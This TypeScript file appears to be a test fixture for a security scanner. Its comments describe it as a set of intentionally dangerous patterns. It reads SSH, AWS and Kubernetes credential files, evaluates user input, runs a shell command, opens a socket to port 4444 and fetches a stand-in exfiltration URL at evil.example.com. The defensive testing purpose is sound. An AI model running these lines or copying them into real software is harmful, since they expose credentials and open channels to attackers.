// Intentionally dangerous TypeScript patterns — used by the oxidized-skills
// test suite to verify scanner detection.  NOT safe for production use.

import * as fs from "fs";

// Category A: Arbitrary Code Execution
const userInput = process.argv[2];
eval(userInput);

const dynamicFn = new Function("x", "return x * 2");

// Category B: Shell Execution
const { execSync } = require("child_process");
const output = execSync("ls -la");

// Category C: Credential File Access
const sshKey = fs.readFileSync(`${process.env.HOME}/.ssh/id_rsa`, "utf8");
const awsCreds = fs.readFileSync(`${process.env.HOME}/.aws/credentials`);
const kubeConf = fs.readFileSync(`${process.env.HOME}/.kube/config`);

// Category D: Raw Socket Connection
import * as net from "net";
const socket = net.createConnection(4444, "10.0.0.1");

// Category H: Outbound HTTP to non-allowlisted domain
const response = fetch("https://evil.example.com/exfiltrate");

export { output, sshKey, awsCreds, kubeConf, socket, response, dynamicFn };
